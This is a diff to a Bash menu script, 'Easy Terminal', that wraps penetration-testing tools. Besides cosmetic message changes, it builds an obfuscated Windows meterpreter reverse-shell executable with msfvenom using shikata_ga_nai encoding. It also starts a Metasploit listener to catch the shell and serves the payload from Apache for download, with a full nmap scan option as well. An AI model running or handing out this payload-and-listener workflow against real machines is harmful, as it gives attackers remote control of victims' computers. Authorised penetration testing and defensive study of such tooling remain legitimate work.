@@ -3,21 +3,21 @@
 print_menu() {
     echo $Blue2"========================================================================="
     figlet "Easy Terminal" | lolcat
-    echo " [---] Welcome To Easy Terminal This Tool By Author : [---]"
+    echo " [---] Welcome to Easy Terminal by: [---]"
     figlet "BO7MED MIX YT" | lolcat
     echo $Blue2"========================================================================="
     echo 
     echo $red "==============================" $red "=============================="
-    echo $red "[1]. Start Nmap Scan          " $red "[2]. Make Payload             "
+    echo $red "[1]. Start Nmap Scan          " $red "[2]. Create Payload           "
     echo $red "==============================" $red "=============================="
     echo $cyan "==============================" $cyan "=============================="
-    echo $cyan "[3]. Create Metasploit Listener" $cyan "[4]. Start Nessus             "
+    echo $cyan "[3]. Create Metasploit Listener" $cyan"[4]. Start Nessus             "
     echo $cyan "==============================" $cyan "=============================="
     echo $okegreen  "==============================" $okegreen "=============================="
     echo $okegreen  "[5]. Start Apache2            " $okegreen "[6]. Stop Apache2             "
     echo $okegreen  "==============================" $okegreen "=============================="
     echo $yellow "=============================="  $yellow "=============================="
-    echo $yellow "[7]. Update & Upgrade System  "  $yellow "[8]. Remove Old Updates Files "
+    echo $yellow "[7]. Update & Upgrade System  "  $yellow "[8]. Remove Old Files         "
     echo $yellow "=============================="  $yellow "=============================="
     echo $white "==============================" $white "=============================="
     echo $white "[9]. Update Script            " $white "[10]. Exit                    "
@@ -46,71 +46,81 @@ show_ip_addresses() {
 
 update_script() {
     script_dir="/home/kali/easy-terminal-script"
-    temp_dir="/tmp/easy-terminal-update"
     repo_url="https://github.com/DevBO7MED/easy-terminal-script"
 
     echo "Updating repository in script directory $script_dir..."
-    
-    # Create a temporary directory to clone the repository
-    mkdir -p $temp_dir
-    cd $temp_dir
 
-    # Clone the repository into the temporary directory
-    git clone $repo_url .
+    cd $script_dir
+
+    git reset --hard HEAD
+    git pull --force $repo_url main
 
     if [ $? -eq 0 ]; then
-        echo "Cloned repository successfully. Updating files..."
-        
-        # Copy the updated files from the temp directory to the script directory
-        cp -r $temp_dir/* $script_dir/
-        
-        echo "Update complete! Please restart the script using option 10."
+        echo "Files updated successfully!"
     else
-        echo "Failed to clone repository."
+        echo "Failed to update repository."
     fi
 
-    # Cleanup
-    cd /
-    rm -rf $temp_dir
-
-    echo "Press [ENTER] key to return to menu."
+    echo "Press [ENTER] to return to the menu."
     read cont
     clear
 }
 
+progress_bar() {
+    local progress=$1
+    local total=100
+    local width=50
+    local filled=$((width * progress / total))
+    local unfilled=$((width - filled))
+    local bar=$(printf "%${filled}s" | tr ' ' '#')
+    bar=$(printf "%-${width}s" "$bar")
+    echo -ne "[${bar}] ${progress}%\r"
+}
+
 execute_option() {
     case $1 in
-        1)
-            read -p "Enter The Target IP Or Link : " IP
+        1)  
+            echo
+            echo
+            read -p "Enter Target IP or URL: " IP
             sudo nmap -sS -O -Pn -sV -p- $IP
             echo
-            echo $okegreen"Press [ENTER] key to return to menu."
+            echo $okegreen"Press [ENTER] to return to the menu."
             read cont
             clear
             ;;
         
         2)  
             echo
-            read -p "Enter LHOST (IP): " lhost
-            read -p "Enter LPORT (Port): " lport
-            read -p "Enter Payload Path (e.g., \"/home/kali\") : " L
-            read -p "Enter Payload Name (e.g., \"Payload.exe\") : " N
+            echo
+            read -p "Enter LHOST \"IP\" (e.g., \"192.168.1.5\"): " lhost
+            echo
+            read -p "Enter LPORT \"Port\" (e.g., \"4444\"): " lport
+            echo
+            read -p "Enter Payload save path (e.g., \"/home/kali\"): " payload_path
+            echo
+            read -p "Enter Payload name (e.g., \"Payload.exe\"): " N
+            echo
+            echo
             echo "Creating Payload..."
-            payload_path="$L"
+            echo
             msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform windows -a x86 -f exe -e x86/shikata_ga_nai -i 5 -o $payload_path/$N
             clear
             print_menu
+            echo
             echo "Payload created successfully!"
-            echo "Path to payload: $payload_path/$N"
-            echo $okegreen"Press [ENTER] key to return to menu."
+            echo
+            echo "Payload Path: $payload_path/$N"
+            echo
+            echo $okegreen"Press [ENTER] to return to the menu."
             read cont
             clear
             ;;
         
         3)  
-            sudo postgresql service start
+            sudo service postgresql start
             sudo msfdb init
-            xterm -hold -e "
+            xterm -fa monaco -fs 13 -bg black -e "
                 echo '========================================================================='
                 echo 'IPv4 and IPv6 Addresses'
                 echo '========================================================================='
@@ -120,59 +130,72 @@ execute_option() {
                 echo 'IPv6 Addresses:'
                 ip -6 addr show | grep inet6 | awk '{print \$2}'
                 echo '========================================================================='
-                echo 'Enter LHOST (IP address for Metasploit):'
+                echo 'Enter LHOST (Metasploit IP Address):'
                 read LHOST
-                echo 'Enter LPORT (Port for Metasploit):'
+                echo 'Enter LPORT (Metasploit Port):'
                 read LPORT
-                echo 'Starting Metasploit With Listener...'
+                echo 'Starting Metasploit with Listener...'
                 msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST \$LHOST; set LPORT \$LPORT; exploit\"
             " &
             ;;
         
         4)
-            echo "Starting Nessus"
+            echo "Starting Nessus..."
             sudo systemctl start nessusd
             clear
-            echo "Nessus Started Successfully. You Can Now Open Nessus By Opening This Link { https://localhost:8834 }"
-            echo $okegreen"Press [ENTER] key to return to menu."
+            echo "Nessus started successfully. You can now access Nessus at { https://localhost:8834 }"
+            echo $okegreen"Press [ENTER] to return to the menu."
             read cont
             clear
             ;;
         
         5)
-            echo "Starting Apache2 Service..."
+            echo
+            echo "Starting Apache2..."
             sudo service apache2 start
-            read -p "Enter Location: " Source
-            read -p "Enter Name: " Name
+            echo
+            read -p "Enter Source file location: " Source
+            echo
+            read -p "Enter file name: " Name
+            echo
             sudo cp $Source /var/www/html/$Name
-            echo "Apache Service Started And Uploaded The Files Successfully"
-            echo $okegreen"Press [ENTER] key to return to menu."
+            echo
+            echo "Open your browser and enter your IP address and file name (e.g., 192.168.1.4/Payload.exe)"
+            echo
+            echo $okegreen"Press [ENTER] to return to the menu."
             read cont
             clear
             ;;
         
         6)
-            echo "Stopping Apache2 Service..."
+            echo "Stopping Apache2..."
             sudo service apache2 stop
-            echo "Stopped Successfully"
-            echo $okegreen"Press [ENTER] key to return to menu."
+            echo "Stopped successfully"
+            echo $okegreen"Press [ENTER] to return to the menu."
             read cont
             clear
             ;;
         
         7)
-            echo "Updating and upgrading system..."
+            echo "Updating system..."
             sudo apt update
+            echo
+            echo "Upgrading system..."
+            echo 
             sudo apt upgrade
-            echo $okegreen"Press [ENTER] key to return to menu."
+            echo
+            echo $okegreen"Press [ENTER] to return to the menu."
             read cont
             clear
             ;;
         
         8)
+            echo
             sudo apt autoremove
-            echo "Removed Successfully"
-            echo $okegreen"Press [ENTER] key to return to menu."
+            echo
+            echo "Old files removed successfully"
+            echo
+            echo $okegreen"Press [ENTER] to return to the menu."
             read cont
             clear
             ;;
@@ -187,8 +210,8 @@ execute_option() {
             ;;
         
         *)
-            echo "Invalid choice. Try Again."
-            sleep 2
+            echo "Invalid option. Please try again."
+            sleep 1
             ;;
     esac
 }
